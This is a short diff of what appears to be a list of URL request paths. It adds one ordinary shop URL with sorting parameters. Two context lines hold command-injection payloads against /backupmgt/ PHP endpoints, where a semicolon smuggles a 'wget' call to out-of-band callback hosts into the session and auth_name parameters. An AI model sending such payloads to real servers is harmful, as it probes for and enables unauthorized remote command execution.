@@ -23847,3 +23847,4 @@ m.naver.com:443
 /backupmgt/localJob.php?session=fail;wget+http://d0m448i93sf15f65rb5gkdo3dccykambu.oast.live;
 /backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d0m448i93sf15f65rb5gjt55d1f4e9bcm.oast.live;
 /figs-loso-gold-figs-30-50-cm?order=DESC&sort=rating&tag=30-50
+/figs-loso-gold-figs-30-50-cm?order=ASC&sort=p.sort_order&tag=50
